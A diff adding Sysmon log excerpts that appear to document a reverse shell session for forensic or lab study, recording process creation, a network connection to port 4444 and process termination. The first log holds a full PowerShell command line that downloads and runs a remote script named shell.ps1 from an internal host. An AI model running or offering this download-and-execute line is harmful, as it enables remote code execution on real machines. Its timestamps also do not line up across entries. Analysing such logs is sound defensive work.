@@ -1,0 +1,70 @@
+========================================================================
+EVIDENCE ARTIFACTS: COMPREHENSIVE REVERSE SHELL LIFECYCLE
+========================================================================
+
+[LOG-01]: SYSMON EVENT ID 1 - PROCESS CREATE (INITIAL EXECUTION)
+------------------------------------------------------------------------
+Log Name:       Microsoft-Windows-Sysmon/Operational
+Source:         Sysmon
+Date/Time:      6/11/2026 2:13:44 PM
+Event ID:       1
+Task Category:  Process Create (rule: ProcessCreate)
+User:           NT AUTHORITY\SYSTEM
+Computer:       DESKTOP
+
+Description:
+UtcTime: 2026-06-11 09:13:44.217
+ProcessGuid: {ace2167b-7c48-6a2a-b20a-000000006100}
+ProcessId: 17092
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.247.133:8000/shell.ps1')"
+CurrentDirectory: C:\Windows\system32\
+IntegrityLevel: System
+ParentProcessId: 4432
+ParentImage: C:\Windows\explorer.exe
+
+
+[LOG-02]: SYSMON EVENT ID 3 - NETWORK CONNECTION DETECTED (C2 SOCKET)
+------------------------------------------------------------------------
+Log Name:       Microsoft-Windows-Sysmon/Operational
+Source:         Sysmon
+Date/Time:      6/11/2026 10:45:19 PM
+Event ID:       3
+Task Category:  Network connection detected (rule: NetworkConnect)
+User:           NT AUTHORITY\SYSTEM
+Computer:       DESKTOP
+
+Description:
+UtcTime: 2026-06-11 17:45:17.685
+ProcessGuid: {ace2167b-f42c-6a2a-280f-000000006100}
+ProcessId: 20716
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP
+Protocol: tcp
+Initiated: true
+SourceIp: 192.168.247.1
+SourcePort: 60890
+DestinationIp: 192.168.247.133
+DestinationPort: 4444
+
+
+[LOG-03]: SYSMON EVENT ID 5 - PROCESS TERMINATED (SESSION Lifecyle)
+------------------------------------------------------------------------
+Log Name:       Microsoft-Windows-Sysmon/Operational
+Source:         Sysmon
+Date/Time:      6/11/2026 2:13:47 PM
+Event ID:       5
+Task Category:  Process terminated (rule: ProcessTerminate)
+User:           NT AUTHORITY\SYSTEM
+Computer:       DESKTOP
+Description:
+UtcTime: 2026-06-11 09:13:47.385
+ProcessGuid: {ace2167b-7c48-6a2a-b20a-000000006100}
+ProcessId: 17092
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP
